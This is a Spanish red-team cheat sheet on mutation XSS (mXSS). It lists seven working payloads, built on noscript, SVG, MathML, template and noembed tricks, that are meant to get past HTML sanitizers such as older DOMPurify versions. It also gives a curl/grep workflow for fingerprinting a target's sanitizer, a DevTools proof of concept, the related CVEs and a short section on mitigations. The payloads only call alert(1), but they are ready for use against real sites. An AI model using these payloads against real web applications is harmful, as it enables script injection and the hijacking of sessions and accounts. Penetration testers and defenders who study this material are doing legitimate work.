---
aliases:
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Explotación de Mutaciones del Navegador (mXSS)

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>` | Sanitizer ve `<p title="...">` inerte. Browser muta: `</noscript>` cierra noscript, `<img>` queda live | DOMPurify viejo + JS habilitado. |
| `<svg><style><g title="</style><img src=x onerror=alert(1)>"></g></style></svg>` | Foreign content (SVG) parser switching libera `<img>` post-sanitizar | DOMPurify y similares con SVG namespace bug. |
| `<math><mtext><table></mtext><img src=x onerror=alert(1)>` | MathML + table mal anidado → autocorrección extrae `<img>` | Targets con MathML support (Firefox/Chrome). |
| `<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>` | Parser stack manipulation — corrección automática del DOM crea event handler ejecutable | Bypass DOMPurify <3.0. |
| `<template><svg><animatetransform onbegin=alert(1)>` | Template content "inerte" pero al moverse al DOM activo, eventos disparan | Apps que extraen content de `<template>` con innerHTML. |
| `<a id="x" tabindex="1"><style>:focus{background:url(javascript:alert(1))}</style>` | CSS-driven via mutation del style hoisting | Edge case bypass. |
| `<noembed><img title="</noembed><img src=x onerror=alert(1)>">` | Mismo principio que noscript pero con `<noembed>` | Bypass alterno cuando noscript filtrado. |
^xss-mxss

### Workflow

```bash
# 1. Identificar sanitizer en uso
curl -s https://target/static/*.js | grep -iE 'dompurify\|sanitize-html\|google-caja\|xss\-filters'

# 2. Verificar versión — DOMPurify <3.0 vulnerable a múltiples mutaciones conocidas
grep -E 'DOMPurify\.version|VERSION' app.js

# 3. PoC en DevTools console:
const dirty = '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>';
const clean = DOMPurify.sanitize(dirty);
console.log('Sanitized:', clean);
document.body.innerHTML = clean;  // Si dispara alert → mXSS

# 4. CVEs conocidos:
#   - CVE-2024-45801 (DOMPurify mXSS via MathML)
#   - CVE-2024-47875 (DOMPurify nested template)
#   - CVE-2020-26870 (DOMPurify SVG namespace)
```

### Sanitizers vulnerables/históricamente vulnerables

| Sanitizer | Versión |
|:---:|:---:|
| DOMPurify | <3.2.4 (varios CVEs históricos) |
| sanitize-html | <2.12.x |
| Google Caja | Discontinuado, varios bugs |
| Ruby Sanitize (Loofah) | <2.21.x |
| Bleach (Python) | <6.x |

---

## Overview

**Mutation XSS (mXSS)** = payload inocuo al sanitizar, pero el **browser parser** lo muta a algo ejecutable al insertarlo en el DOM (típicamente via `innerHTML`).

Sanitizer trabaja sobre string. Browser parser trabaja sobre tree con corrección automática de tags mal anidadas, foreign content (SVG/MathML), template hoisting. Discrepancia = bypass.

**Mitigación:**
- Trusted Types API.
- `textContent` en vez de `innerHTML` cuando posible.
- Sanitizer al día (DOMPurify ≥3.2.4).
- Re-sanitizar post-mutación si la app extrae content de templates.

---
